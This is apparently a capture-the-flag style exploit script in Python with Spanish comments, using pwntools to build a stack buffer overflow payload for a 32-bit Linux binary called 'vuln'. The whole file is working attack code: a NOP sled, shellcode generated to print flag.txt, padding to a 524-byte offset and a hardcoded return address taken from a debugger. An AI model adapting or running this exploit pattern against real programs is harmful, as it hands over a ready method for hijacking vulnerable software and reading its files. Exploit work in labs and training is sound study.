import sys
from pwn import *
#./vuln $(python3 overflow.py)
# Configuración para i386
context.update(arch='i386', os='linux', log_level='error')

def generate_payload():
    # 1. Dirección calculada en gbd
    ret_addr = p32(0xffff8120)

    # 2. Shellcode (cat flag.txt)
    shellcode = asm(shellcraft.cat('flag.txt'))

    # 3. Construcción exacta
    offset = 524
    nops = b"\x90" * 10
    
    # Creamos la base: [NOPS] + [SHELLCODE]
    payload_base = nops + shellcode
    
    # Rellenamos hasta el offset 524 y concatenamos la dirección
    padding = b"A" * (offset - len(payload_base))
    payload = payload_base + padding + ret_addr
    
    return payload

if __name__ == "__main__":
    # Importante: Escribir el payload en bytes
    payload = generate_payload()
    sys.stdout.buffer.write(payload)
